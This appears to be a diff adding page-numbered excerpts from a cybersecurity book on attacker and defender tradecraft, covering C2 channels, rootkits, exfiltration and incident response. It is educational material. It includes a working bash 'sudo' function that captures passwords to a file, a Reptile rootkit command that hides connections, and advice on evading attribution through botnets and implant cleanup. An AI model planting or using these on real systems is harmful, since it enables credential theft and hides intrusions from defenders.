@@ -35,3 +35,654 @@ Active Manipulation
 Real-Time Conflict
 The Research Advantage
 Clearing the Field
+
+p.12 The goal 
+of Adversarial Tradecraft in Cybersecurity is to dive deep into both deceptive attacker 
+techniques and detectionsThis text starts with a chapter on theory to help prepare 
+readers for the following chapters, followed by a chapter focused on setting up 
+supporting infrastructure. After that, the book works through various escalating 
+techniques that may be leveraged by either side in a cyber conflict. Chapters 3
+through 8 cover tactics, techniques, and tools that both sides can leverage to get the 
+advantage in a conflict. Chapter 8 specifically goes into how to resolve a conflict and 
+remediate an intrusion such that the attacker doesn't maintain access. A synopsis of 
+each chapter can be found below, covering some of the high-level topics included in 
+the book.
+
+p.21 Game theory
+Game theory (GT) is a form of analytic discipline in which the optimal strategies 
+of a game are studied for various players. Essentially, GT attempts to find the best 
+response a player could make in a given situation[2]. GT often focuses on simple 
+games in which basic strategies can be empirically determined as the best. This 
+is because simple games in GT can be expressed as mathematical notation, only 
+requiring three basic inputs: the players of the game, the information and actions 
+available to them at decision points, and the consequences of those decisions. 
+
+p.22 . A 
+good example of using an effective dominant strategy is using Microsoft ATA to 
+detect Bloodhound enumerating Active Directory[5][6][7]. I have seen high-security 
+environments where layered controls have created a legitimately imposing defense, 
+and in my experience, even these environments still have vulnerabilities and 
+abuse issues
+
+p.25 In the military sphere, the arena is often described as computer network operations 
+(CNO) with two distinct sides, computer network attack (CNA) and computer 
+network defense (CND).
+
+p.31 Generally, I will split my team 80/20 with the bulk of my team working defense in 
+terms of expertise and preparation time (which we will spend a lot of time discussing 
+in the next chapter). There are a few reasons for this. Mostly, it is harder to work 
+back a compromise than to attack and still find vulnerabilities later in the game. That 
+means if we focus on defense upfront, we can shift more people to offense later if we 
+think we are reasonably secure. The team in PvJ wants to be reasonably assured we 
+are operating from a position of security, otherwise our own attacks and offensive 
+operations can be easily thwarted if we lack confidentiality in our actions and 
+infrastructure. Playing in PvJ or any attack and defense competition for that matter 
+can be very stressful, as you are simultaneously trying to secure your environment 
+while responding to live attackers on your systems. T
+
+p.33 While it's not always the most glamorous approach, if you can avoid the opponent's 
+strongest tools or operations you can win the battle by forcing your opponent into 
+territory you are more comfortable with. On the offensive side, this could look like 
+avoiding or using different techniques on a host if it has an EDR agent on it. On the 
+defensive side, this could mean limiting all outbound traffic or sending it through 
+a proxy to hinder egress connections out of a certain area. These examples are less 
+active deception or manipulating the enemy's perception of the conflict, but they 
+are still ways to force the opponent to meet you on your terms while avoiding 
+environments or situations where they have the advantage.
+
+p.34  Obfuscation is not a 
+replacement for encryption or solid security foundations that protect the elements 
+of confidentiality, integrity, availability, authentication, authorization, and nonrepudiation (CIAAAN). When we use obfuscation, we will use it as an additional 
+layer to actively protect our tools and operations, while still making sure we have 
+the basic controls, such as encrypting our communications.
+
+p.35 Live forensics is when the defender responds to the machine before powering it 
+off[29]. While this can be done in a number of ways, sometimes with the attacker still 
+in control of the host, modern EDR frameworks can both quarantine the host so only 
+the defender can access it and respond to the machine live. O
+
+p.36 Data encryption 
+is one of the strongest tools available for physically protecting data at rest. Because 
+physical security is such a trump card, all hard drives should be encrypted at rest 
+using industry standards such as LUKS, FileVault, or Bitlocker
+
+p.45 We have our CIAAAN attributes to help use and evaluate the various security 
+aspects of a technique or strategy. These attributes will help us approximate which 
+strategies are stronger with respect to a certain defense. We have several models, 
+such as kill chains and attack trees, to help us evaluate the reaction correspondence 
+between offense and defense. These models will help visualize the evolution of 
+strategies and decisions at play. We also have our principles, which we can leverage 
+to help guide us to more advantageous techniques and dominant moves. These 
+principles, such as deception, physical access, economy, humanity, planning, 
+innovation, and timing, will all be crucial elements in gaining the advantage in a 
+conflict
+
+p.51  A contingency chat solution would 
+preferably have a strong cryptographic method for proving authentication, such as 
+GPG keys or using a solution such as Signal[4]
+
+p.52 . If we start to get data contrary to our plan, such that some techniques 
+may be detected, we need to modify our plans and potentially our tooling to support 
+our new strategies. This is rooted in our principle of innovation: if our strategy 
+is discovered, we will lose our advantage so we should be prepared to pivot our 
+operations in that situation. 
+
+p.53 Contingency plans, in terms of the team's expertise, mean having the backup team 
+trained in those areas and developing a training plan for cross-training resources. 
+Cross-training can be in the form of weekly educational meetings, brown bags, or 
+even quarterly formal training programs. Your group should be meeting regularly, 
+which is a good time to exchange recent lessons learned. You can follow this up with 
+individual training programs around skills team members are looking to improve. 
+Formal training courses can be some of the best ways to upskill people quickly 
+in areas you are interested in. SANS, for instance, is an incredible resource for 
+cyber education, but the price is significant if you're on a tight budget[6]. Many free 
+resources also exist in terms of cyber training, but the most important thing is to give 
+employees dedicated time for training. One of my favorite free resources for lowlevel technical skills is https://opensecuritytraining.info/, which includes over 23 
+high-quality courses, many with videos[7]. Another interesting site for free education 
+courses is Cybrary, while these courses aren't as in-depth as OpenSecurityTraining, 
+their Career Paths include many relevant skills and their courses have a high 
+production finish[8]. 
+
+p.56 The defense needs 
+the ability to do root cause analysis (RCA) and understand how the attacker got 
+in and patch that vulnerability before they can exploit it again. From the offensive 
+perspective, this could help determine when we will exit the target environment. 
+You will also want to plan for the event that the operation takes an unexpected 
+turn or goes in the opponent's favor. For the offense, this means planning how 
+we will respond if the campaign is uncovered, our tools are exposed publicly, or 
+even our operators are identified. This is often thought of as program security
+(Network Attacks and Exploitation: A Framework, Matthew Monte, page 110).
+
+p.59 Signal collection
+To start, let us look at host-based security event generation and collection. In 
+this space, there are many traditional solutions, such as anti-virus providers like 
+McAfee, Microsoft Defender, Symantec Endpoint Protection (SEP), Kaspersky, and 
+ClamAV to name a few. While often thought of as depreciated, these agents can 
+still produce particularly useful alerts on known malware and offensive techniques. 
+
+p.59 . There are also endpoint detection and 
+response (EDR) platforms, which are a more modern evolution of previous antivirus scanning solutions. While EDR platforms incorporate many of the same factors 
+as a traditional AV, one major differentiating factor is these tools let operators make 
+arbitrary queries on their data. EDR agents also enable remediation and response 
+actions to be taken on the impacted hosts remotely while the host is still online, 
+which is known as a live response. These capabilities can be extremely effective 
+when dealing with a live attacker, by leveraging the real-time ability to counter the 
+attacker's plans on a specific host. Another core value of these tools is recording 
+at a higher level of granularity all actions taken on the target. For example, outof-the-box Windows and OS X may not record process creations, command-line 
+parameters, modules loaded, and so on. EDR agents can be configured to record 
+detailed process telemetry and to send this data to a central server, allowing for 
+alerting and reconstruction of the incident. Reconstruction of the breach is key 
+to ensuring we can prevent further occurrences of the threat. This is a key theme 
+when performing incident response and is known as root cause analysis (RCA).
+
+p.59 Another popular technique for detecting compromise 
+in corporate environments using EDR solutions is known as anomaly detection. This 
+involves sorting all of the processes or executable telemetry in a given environment 
+and going through the outliers. Often starting with the fewest occurrences of a given 
+executable or process in an environment will uncover malicious anomalies. There 
+are many popular commercial offerings in this space, such as Microsoft's Advanced 
+Threat Protection, CrowdStrike, CarbonBlack, and Tanium, to name a few. One of 
+the issues with commercial offerings is they are often configured to alert on as few 
+false positives as possible. 
+
+p.62 From a behavioral 
+perspective, you could look at how quickly users navigate your pages to determine if 
+automated abuse is occurring. From an anomaly perspective, you could sort data and 
+view login attempts from similar IP addresses, to detect account takeover attempts 
+of your user population. Another important log source to review is internal tooling 
+and applications. Reviewing your own tool's logs for abuse or anomalous logins can 
+help determine if someone in your group was compromised or if you have an insider 
+threat.
+
+p.63 There are tons of examples within the Awesome 
+Honeypots GitHub repository (https://github.com/paralax/awesome-honeypots), 
+but the important part is picking an applicable solution to your network. Honeypots 
+or tokens have been made for all kinds of applications and their use in your network 
+should be strategic; otherwise, they will sit undiscovered for years.
+
+Log aggregation is one of the biggest time-saving tasks a defensive team can focus 
+on. In my opinion, logging pipelines are one of the unsung heroes of modern 
+defensive infrastructure. Simply, logging doesn't get the attention it deserves in most 
+defensive publications.
+
+p.64 A nice to have would be a security orchestration, automation, and response (SOAR) 
+application to help automate alert enrichment. In many large deployments, SOAR 
+applications act as the connective tissue tying a myriad of other appliances into the 
+SIEM. Such an application will reach out across your network and correlate the alerts 
+with various information to get more context. This tool could enrich elements of 
+the alert with more data, such as the user in an alert with all of their attributes from 
+Active Directory. A good open-source example of a SOAR platform is Cortex[29]. 
+
+p.71 You should also consider offensive components on your blue team. This is essentially 
+vulnerability management and penetration testing expertise, using the skills required 
+to scan your infrastructure for vulnerabilities. You can pull a lot of this infrastructure 
+from the next section on offensive perspectives, though I don't think the persistence 
+or deception tactics apply if your team is just self-assessing for vulnerabilities. 
+
+p.72 It helps to have metrics to measure the operational efficiency of a team[60]. For that, 
+we can use KPIs. KPIs are small measurable indicators we can use to benchmark 
+how our team performs and gauge differences in their performance over time.
+
+p.78 A hash-cracking server should be considered as a nice-to-have for getting the team 
+more access as they penetrate the target environment. While often thought of as 
+extraneous, this infrastructure can greatly enable an offensive team in an operation. 
+Undoubtedly the team will come across some form of encrypted or hashed secrets 
+during their operation, which they will want to crack to gain further access. By 
+hosting your own solution for this you can both protect the operational security 
+of the program and manage the resources on which jobs you want to crack faster. 
+A good example of such a project for managing cracking infrastructure would be 
+CrackLord[84]. Analogous to preparing the cracking infrastructure, this team member 
+could also prepare rainbow tables and wordlists in on-hand locations. Preparing 
+such simple word lists can greatly enable a team's cracking and enumeration 
+efforts. I
+
+INVISIBLE IS BEST
+
+p.90 Traditional forensics has historically involved arriving after the attacker has already 
+finished their operations and then analyzing disk images or other artifacts left by the 
+attacker. Commonly known as dead disk forensics, it involves looking at material 
+where the source machine is powered down or no longer actively changing the 
+media, in some ways making it the opposite of live response. Commercial tools such 
+as FTK Imager and Cellebrite exist for taking forensic images of devices after an 
+incident has occurred and analyzing this forensic data for signs of an attack. You can 
+also use open-source tools such as dd from virtually any operating system to create 
+a forensic image of a device[1].
+
+p.102 Many 
+traditional forensics tools will completely miss these techniques, as the offense is no 
+longer leaving file artifacts on disk. That means traditional forensic tools such as The 
+Sleuth Kit and Cellebrite will be near useless so long as the offense doesn't create 
+file system artifacts. Similarly, tools such as OSQuery or EDR agents that just track 
+parent-child process relationships will miss these process injection techniques, which 
+often are not spawning new processes.
+
+p.105 BLUESPAWN includes a built-in hunting function that is 
+mapped to the MITRE ATT&CK framework. The generic hunt function will run 
+all of the hunt modules, although these can also be called in a direct fashion by 
+specifying a --hunts flag and the MITRE ATT&CK technique number.
+
+p.106 By leveraging 
+the principle of planning and physical access, the defense can often ensure that 
+their tooling is in place before the attacker arrives
+
+p.107 In line with the principle of planning, we want this tooling in place before the 
+attacker ever arrives. We can install Sysmon, set it up with remote logging, and 
+have it inspect on specific syscalls to detect process injection[39]. Sysmon comes with 
+the SysInternals Suite and will install Sysmondrv when called with the CLI tool for 
+the first time. Sysmon needs a policy to configure it; thankfully, SwiftOnSecurity
+provides an amazing base policy that is really well commented, so you can see 
+how it is configured to alert[40
+
+Chapter 4: Blending In
+• LOLbins
+• DLL search order hijacking
+• Executable file infection
+• Covert command and control (C2) channels
+• ICMP C2
+• DNS C2
+• Domain fronting
+• Combining offensive techniques
+• Detecting ICMP C2
+• Detecting DNS C2
+• Windows centralized DNS
+• DNS insight with Sysmon
+• Network monitoring
+• DNS analysis
+• Detecting DLL search order hijacking
+• Detecting backdoored executables
+• Honey tokens
+• Honeypots
+
+p.117 LOLbins, or living off the land binaries, deserve a special mention. These are 
+essentially native utilities or executables that come as default with the operating 
+system and can be abused by an attacker in some form. There is an extremely wide 
+availability of techniques within living off the land techniques. LOLbins exist for 
+almost every operating system, specifically Windows and Linux, although each set 
+is OS-specific. The windows list is maintained at https://github.com/api0cradle/
+LOLBAS and is organized by file type, such as executable, script, or library. The 
+Unix list is maintained at https://gtfobins.github.io/ and can be sorted via 
+functionality, which makes it extremely useful for finding privilege escalation bugs.
+
+p.118 Another very commonly abused one was certutil.exe, a tool 
+traditionally intended for managing certificates on Windows, as a way to download 
+more tools onto the host[6]. But these LOLbins are ubiquitous. Another, lesser-known 
+way to download files in Windows 10 is using the AppInstaller.exe utility[7]. 
+The following command line will download a file to %LOCALAPPDATA%\Packages\
+Microsoft.DesktopInstaller_8wekyb3dbbwe\AC\INetCache\.
+
+Modern dynamically linked libraries, or DLLs, work by searching for the necessary 
+libraries and API calls on the target system when the executable runs. These dynamic 
+libraries will search a series of locations, such that developers can add their own 
+libraries for priority loading and testing.
+
+ Granted, if the module 
+is already in memory or is registered with the KnownDLLs registry key, they will 
+be loaded instead. After that, Windows will search directories in this order to find a 
+DLL to load:
+1. The directory the application is loaded from
+2. The system directory
+3. The 16-bit system directory
+4. The Windows directory
+5. The current working directory
+6. The directories that are in the PATH environment variable
+
+p.122 One of my favorite examples of a covert channel is data embedded in the ICMP 
+protocol. ICMP, or the Internet Connected Message Protocol, is a network layer 
+protocol typically used for testing if systems are up. ICMP can also be used to 
+understand how many network hops away a given host is with utilities such as 
+traceroute. ICMP covert C2 channels typically work by smuggling arbitrary data 
+related to the C2, in the data field of an ICMP_ECHO packet.
+
+p.123 Next, we will examine using DNS as a covert channel. DNS is one of the core services 
+of the internet, turning human-readable domain names into IP addresses machines 
+can understand. DNS, or the Domain Name System, is both a UDP and TCP protocol 
+that can resolve data in a hierarchal fashion. This means a DNS request will continue 
+searching upward to the root domain for a server that can resolve the given request. 
+
+p.128 Let's start by looking at ways to detect anomalous traffic. If you can detect malicious 
+traffic on your network, then this is often a strong indicator of which hosts are 
+infected on your network. We can drill down on the infected hosts by first detecting 
+them calling out of the network, then finding which process on a particular host 
+was making the network connection, and finally determining how that process was 
+started or persisted. We can use a collection of network and on-host sensors to alert 
+on traffic or host-based indicators. These forensic steps will help us recreate the 
+incident, which may reveal how the attacker got in, persisted, or spread throughout 
+the environment, all important steps in tracking their activities after the initial 
+detection
+
+p.131 We can also dump all of the DNS client requests using something like tshark. This is 
+both great for collecting DNS information on the wire, as it travels across a gateway 
+for example, or to use as a one-off tool for collecting on an endpoint.
+
+p.134-135 A technique that is also hard to detect is backdooring executable files. Still, there are 
+a number of built-in features we can use to detect when the integrity of the system 
+has been violated. One nice feature of modern software is that publishers will often 
+release a cryptographic hash with their software so users can verify the integrity of 
+the package hasn't been modified. On Windows, portable executables files can also 
+be signed by their developers so that the end users can make sure their software is 
+untampered with.
+
+Another way you can detect backdoored executables in your environment is through 
+whitelisting
+Finally, you can always detect these backdoored executables behaviorally. 
+
+p.143 By removing the defender's logs and 
+tampering with their tools, we can severely hamper the defender's ability to detect 
+and then respond to the event. In their most pure form, these deceptive techniques, 
+which wrestle the basic perspective operations away from the defenders, are known 
+as rootkits. 
+
+p.149 For our example, we will focus on Reptile, one of my favorite LKM rootkits[10]. 
+Reptile has a fairly basic feature set, it can hide directories, files, contents within files, 
+processes, and even network connections. Hiding contents in files is a handy feature 
+for backdooring configuration files or hiding web shells. Tools like Reptile will be 
+important for hiding our various forms of persistence and attacker utilities. Under 
+the hood, Reptile makes heavy use of the khook framework and the kmatryoshka 
+loader. Reptile uses the khook framework to make hooking API calls from the 
+kernel much easier[11]. Function hooking is a popular technique where a program 
+will intercept an API call and substitute its own function before calling the normal 
+API handler
+Reptile also comes with an independent network client that can send a magic packet 
+through TCP, UDP, and even ICMP, similar to the ICMP backdoor Prism that we 
+looked at in Chapter 4, Blending In. Unlike the apache2_BackdoorMod, which only 
+offered protection within its specific service, an LKM rootkit such as Reptile can 
+easily hide all connections to a specific IP address. To hide all of the attacker's 
+network connections with the Reptile rootkit, execute the following with your IP 
+address, instead of the private IP address 172.31.33.7:
+$ /reptile/reptile_cmd conn 172.31.33.7 hide
+
+p.152 The following techniques will work better in a general sense when you don't know 
+what tools or rootkits your opponent might be using. One general rootkit detection 
+tool is called unhide[22]. While unhide won't call out Reptile by name, it can be used 
+to find some of Reptile's hidden processes with:
+$ sudo unhide brute -v -f
+
+p.158 One example of backdooring your code that I have personally used to great success 
+is backdooring the JavaScript on a major website targeted by a phishing campaign. 
+We had phishers cloning our main web page and phishing our customers every day, 
+effectively stealing their credentials, then logging into their accounts and cashing 
+out their digital wallets. While we could detect and take down the phishing pages, 
+the attackers would simply clone the website and launch the campaign again the 
+next day. To counter the attackers, we placed a backdoor in the JavaScript of our 
+own homepage, such that the attackers ran this code when they cloned our page 
+and when the victims would visit these cloned phishing pages. This technique 
+provided excellent early intel on their new phishing sites as well as the users that 
+were submitting their credentials. Not only would we see the attackers working 
+locally on the page as they tested it before deployment, but we would also see where 
+the new phishing pages were hosted. 
+
+chap 6 real time conflict
+Situational system awareness
+• Clearing Bash history
+• Abusing Docker
+• Keylogging
+• Screenshots
+• Getting passwords
+• Searching for secrets
+• Backdooring password utilities
+• Hijacking lateral movement channels
+• Triaging a system
+• Performing root cause analysis
+• Killing processes
+• Blocking IP addresses
+• Network quarantine
+• Rotating credentials
+• Restricting permissions
+• Hacking bac
+
+p.170 Keylogging can be an incredibly powerful technique for getting intel on the other 
+party if you're on the same machine as them. A large goal in our operations is getting 
+inside of the operations and communication channels of the opponent. If we can 
+breach their communications, we can get access to their internal thoughts, plans, and 
+responses, potentially before they execute them
+
+p.173 I love searching for keys and passwords in config files on disk, so much so that 
+I wrote a helper utility expressly for this purpose. GoRedLoot (GRL) is a crossplatform tool to do exactly that[20]. GoRedLoot can be thought of as a highly 
+advanced grep. GRL will consider file names and content to both include and 
+exclude from its searches, such that you can look for specific content while 
+accounting for false positives. It also does this in an intelligent way, first ignoring 
+files with certain names, then adding files with certain names, then ignoring files 
+with certain content, and finally adding files with specific content. This order is 
+important for skipping large files and removing false positives.
+
+p.174 There is a really old-school trick for getting a user's password even if you don't have 
+root on a system. For example, if you have access to a user account, and that user 
+can sudo, but you don't know their password and want it, you can backdoor the 
+user with some malicious Bash functions. We want to put this malicious function 
+in their ~/.bashrc, and if we are using something like Reptile, then this is a great 
+opportunity to hide text within a file. I pulled this script almost directly from this 
+wonderful article by NeonTokyo[22], but again, this is a really old technique that can 
+also be pulled off with malicious aliases:
+function sudo () { 
+ realsudo="$(which sudo)"
+ read -s -p "[sudo] password for $USER: " inputPasswd 
+ printf "\n"; printf '%s\n' "$USER : $inputPasswd\n" >> /var/tmp/hlsb 
+ $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" >/dev/null 
+2>&1 
+ $realsudo "${@:1}"
+}
+
+p.175 The core of most Unix authentication is handled by a framework called PAM. 
+PAM is an old system, from around 1995, that stands for pluggable authentication 
+modules. The PAM framework also exists in macOS, and similar techniques may 
+work there. PAM creates an integrated authentication framework that allows many 
+modules to be added, similar to the Apache2 modules and kernel modules we saw in 
+the previous chapter. T
+
+p.177 As we've already seen, SSH is a very popular remote administrative protocol on Unix 
+systems. However, there is often an additional program that works with SSH, known 
+as SSH Agent, which is designed to keep connections open for a sustained period of 
+time without reauthenticating[26]. One feature of SSH Agent is known as SSH Agent 
+Forwarding, or ForwardAgent, which is used for chaining SSH connections in a way 
+that does not require the admin to move their private key to each host before the 
+next jump. This technique of SSH Agent Forwarding is often used by administrators 
+when pivoting through a bastion to a secure environment. 
+
+p.178 A slightly different technique from SSH agent hijacking is ControlMaster hijacking. 
+SSH multiplexing, or SSH ControlMaster, is an advanced SSH setting that allows a 
+special socket to be set up for long-term or multiple SSH commands[28]. It does this 
+primarily by using a feature called ControlMaster to open a long-term socket for 
+many subsequent SSH connections to travel over. We can abuse this feature as an 
+attacker to pivot or gain remote access to the same hosts via these sockets[29]. We first 
+start by searching to see if ControlMaster is enabled.
+
+p.179 On Linux there are many forms of remote administration beyond SSH. Some 
+frameworks, like Ansible, will leverage SSH to apply administrative templates. 
+Other frameworks, however, like Puppet, Chef, and SaltStack, for example, all 
+use agents that call back to a master server, often hosted on Linux. If these master 
+administrative servers can be compromised, they can lead to the compromise of 
+every other machine in the environment. 
+
+On Windows the traditional avenue is abusing Windows Active Directory. Many 
+tools exist for this, such as PowerView, BloodHound, PowerSploit, Impacket, 
+and CrackMapExec just to name a few. Once malicious actors get access to Active 
+Directory they can use this to get credentials or change passwords for any of the 
+users in the domain. Further, they can push out Group Policy objects to set registry 
+keys or run scripts on computer members of the domain. Again, this is a topic that 
+is beyond the scope of this chapter and could arguably be a book on its own. That 
+said, there is a large amount of tooling, blogs, and documentation around Active 
+Directory exploitation and abuse already on the internet[32]
+
+p.181  Commands like 
+last, w, and who are good for getting an idea of the recent users that are logged on 
+or recently logged on to a machine. Granted, these commands rely on logs in /var/
+such as utmp, wtmp, btmp, and last, meaning these results are fairly easy to tamper 
+with. Commands like netstat -antp and losf -i are good for understanding 
+current network connections, including remote administration and administrative 
+utilities.
+
+p.182 If you've identified malicious processes, one of the first steps may be stopping 
+the malware from executing. You will want to list the network connections and 
+the processes that have them open, with commands we've already seen, such 
+as losf -i, netstat -p, and ss -tup. Another technique may involve checking 
+how long a process has been running, perhaps with a command like ps -o 
+pid,cmd,etime,uid,gid, especially relative to other long-running processes. Once 
+you've located the malicious process, you will want to terminate it with a kill -9 or 
+killall command. You may also want to move the binary or change its name in the 
+event it has been persisted in some way. If you want to kill a specific user's tty, you 
+can use a command like pkill -9 -t pts/0, where pts/0 is the tty you wish to kill. 
+If you want to kill all processes by a specific user, you can use a command like pkill 
+-U UID or killall -u USERNAME.
+
+p.189 controlling users: As we've seen, low-privilege users can be an effective way into a system or a form 
+of persistence for attackers. In this section, we will briefly look at ways to counter 
+specific account abuse.
+One idea in looking for user abuse or trapping attacker persistence is setting up 
+skeleton templates for new users. As we saw in previous chapters, attackers will very 
+often create new accounts on a system as a way to get back in. By applying default 
+controls to new users, we can catch these simple persistence techniques with our 
+own counter-techniques. skel works by applying anything in /etc/skel/ to all new 
+users created. So we can give them things like a custom .bash_profile or .bashrc in 
+their home directory before they ever log in. For example, we can change the default 
+location of their history file, such that an attacker may not notice their bash_history
+is being recorded. Further, we can add timestamps to the history file to make it a 
+little better for forensic analysis:
+# echo 'HISTFILE=/var/log/user_history' >> /etc/skel/.bashrc
+# echo 'HISTTIMEFORMAT""%d/%m/%y %""' >> /etc/skel/.bashrc
+Another thing you can do, if you know a specific account is being abused, is change 
+that account's default login shell to an alert program you control or something like 
+rootsh, the shell keylogger we saw earlier. rootsh is a shell wrapper that will collect 
+all information entered into the session, making it just as valuable for defensive 
+teams as for the offense. To change a user's default shell, edit the /etc/password as 
+we saw in the previous section with the offense
+
+p.200 One of the wilder stories I've heard about the DEF CON CTF involved a team called 
+sk3wl0fr00t, or Skewl of Root. Supposedly, one of the years, they determined the 
+other teams were further network hops away than the score bot service, such that 
+they could reliably tell the difference between other teams and the score bot service 
+based on the TTL of their IP traffic. They were then able to drop all traffic from other 
+teams but still allow the traffic from the score bot checks, based on the packet's TTL. 
+It's an example of a dominant strategy, or another way of gaming the game, like we 
+were looking at before. We can accomplish something like that with the following 
+iptables rule, say if the score bot service was coming from one network hop away, 
+and the other teams were at least two network hops away:
+$ sudo iptables -A INPUT -m ttl --ttl-lt 63 -j DROP
+$ sudo iptables -A OUTPUT -m ttl --ttl-lt 63 -j DROP
+If the other hosts are Linux hosts with a default TTL of 64, then the preceding 
+command would drop any host that has performed two or more network hops. 
+Additionally, if we wanted to block any Windows machines that have a default TTL 
+of 128, we could use a command like the following:
+$ sudo iptables -A INPUT -m ttl --ttl-gt 65 -j DROP 
+$ sudo iptables -A OUTPUT -m ttl --ttl-gt 65 -j DROP 
+A strategy such as this gives a team a clear advantage, like a shield that repels all 
+other team's attacks. Obviously, using such dominant strategies are things teams 
+should consider how to accomplish and game designers should audit for and 
+remove. These strategies are often harder to come by in real life or a balanced 
+competition because more options exist to counter them and open the field of 
+play up
+
+TARGETING RESEARCH AND PREP: This is where the red team will leverage tools such 
+as Bloodhound or enumerate internal wikis to understand how to access different 
+systems. Even knowing which members of the organization have authority, or that 
+others would listen to, can be important for further social engineering.
+
+p.205 One method we can use for generating and 
+disseminating our analysis is F3EAD. F3EAD is a model used in military intelligence 
+targeting that stands for Find, Fix, Finish, Exploit, Analyze, and Disseminate.
+
+p.210 Attribution can be a touchy subject. In some contexts, it matters a lot less, as with 
+commodity malware or the members of another team in a competition environment. 
+Although in some settings, understanding who is attacking you can be one of the 
+most important first steps in stopping the attacks. I've always been a big fan of 
+internally tracking common bad actors, relative to the context.
+
+p.214Ending an operation is arguably just as important as starting an operation. Planning 
+several end conditions early on with playbooks can help your team achieve their 
+goals throughout the conflict. From the offensive perspective, after an operation, you 
+will want to clean up the environment to ensure you are not caught or attributed to 
+any breaches. In the event you've been detected, the offensive operations will need 
+to save as much of the operations as they can, either pivoting deeper internally or 
+by burning down their access and backing out of the target environment. If you are 
+a defender, making sure that you've successfully scoped the intrusion is paramount. 
+
+• Exfiltration with protocol tunneling
+• Using steganography in exfiltration
+• Public dump sites
+• Public anonymity networks
+• Private anonymity networks
+• Program security
+• Taking down infrastructure
+• Retiring tools and techniques
+• Fully scoping an intrusion
+• Containing the incident
+• Remediation activities
+• Post-mortem analysis
+• Publishing lessons learned
+• Forward-looking activities
+
+p.216 As we saw before, covert channels can be critical for evading network monitoring. 
+There are many popular network protocols for exfiltrating data, such as SMTP, FTP, 
+and HTTPS, as this can hide in normal network traffic and also supports large file 
+transfers for exfiltration. These protocols also include native system utilities for their 
+use, meaning they can often be leveraged without additional tools. For example, both 
+Windows and Linux systems come with a native FTP client that can be invoked from 
+the command line.
+
+p.217 Steganography is the art of hiding data in plain sight, a mix of deception and 
+obfuscation
+
+PacketWhisper is a neat project by TryCatchHCF that uses both DNS as a covert 
+channel and hides the data using a substitution cipher to encode it into random 
+subdomains[5]. PacketWhisper leverages TryCatchHCF's other tool, the Cloakify kit[6], 
+to actually encode the data into the various subdomains. When using specialized 
+exfiltration tools, you will want to make sure they are protected by your existing 
+post-exploitation kits. Any forensic evidence of these tools on a host can lead to the 
+use of these tools and then uncovering how (and potentially where) the data was 
+exfiltrated. For example, if the substitution ciphers of PacketWhisper are discovered, 
+they can easily be reversed to the data being exfiltrated (as there is no key protecting 
+the data).
+
+p.219 Often, attackers will need to come from many addresses across the internet so as     Custom private anonymity networks
+to make it harder for defenders to profile and block their traffic. While Tor is a 
+good alternative, it is easy to fingerprint and block in certain environments. Rather, 
+attackers will need to cover multiple geographic locations and service providers 
+so that they can't be blocked simply based on the source or amount of data they 
+are sending to the target. The offense needs a way, especially on the outside of 
+a network, to probe infrastructure without being identified before the operation 
+begins. Similarly, if they are trying to get data out of the network, they should have 
+options that won't reveal the attacker's true infrastructure
+Some attackers can rent this infrastructure in the form of a botnet. This paid 
+access can give attackers access to internal networks, or even tons of residential or 
+commercial IP addresses that they can operate from. Using compromised hosts, 
+or even pivoting through a paid botnet, is a very real technique for anonymizing 
+malicious traffic. A legal alternative may be to use a VPN or proxy network, which 
+allows attackers to egress out of specific geolocations or even types of service 
+providers. That said, some of these private VPN providers are still easy to fingerprint 
+and filter. Because of this, some VPN providers offer special paid VPN services 
+that egress out of networks where customers run their free VPN software. Instead 
+of serving ads to their free tier users, they monetize the platform by using the free 
+VPN users as egress locations for the paid users. This type of VPN service is highly 
+valuable. Having millions of residential IPs to rotate through means attackers can 
+easily get around restrictions such as IP blacklisting, geofence restrictions, and API 
+limitations.
+
+p.223 Take down any public infrastructure as soon as you don't need it. You can also block 
+off ports when you aren't using infra operationally. You can take this even further 
+by restricting ports during your operation to just your target's IP space. A big reason 
+for limiting the public availability of your attacker infrastructure is that various 
+intelligence services will scan the internet for these services, and categorize your IP 
+space, domains, or even tooling as malicious. This can severely harm the security of 
+your offensive program, so it's important to protect your infrastructure and not get 
+careless with its administration.
+You will also want to remove all implants or evidence from the victim network 
+before ending the operation. Any tools you leave on disk or in memory, even if not 
+discovered originally, can potentially be found forensically at a later date, kicking off 
+a forensic investigation after you've already finished your operation. One technique 
+to automate this cleanup is to include kill dates in your malware or agents, such that 
+after a certain date, they can delete themselves or no longer work. This is a good 
+technique for limiting your implants and infra to a time-bound operation and can 
+be useful for automatically removing certain implants in the event you forget about 
+them.
+
+p.225 Responding to an intrusion
+Scoping an incident is critical to a proper response. If you respond too soon, you 
+may tip your hand or knowledge to the attacker, allowing them to change their 
+tactics and escape detection. On the other hand, if you don't respond soon enough, 
+you could allow the attacker to continue to spread through the environment, and 
+potentially even reach their goal. If you think you've caught the initial compromise, 
+it may be safe to respond with just a brief triage or remediating a single host. 
+However, if you think you've caught a large, ubiquitous infection, you will want to 
+scope the full incident before responding to any one host. Furthermore, if you learn 
+that the attacker is close to their goals, you may want to take more dramatic steps, 
+such as quarantining or taking certain assets offline to prevent the attacker from 
+reaching their perceived objective
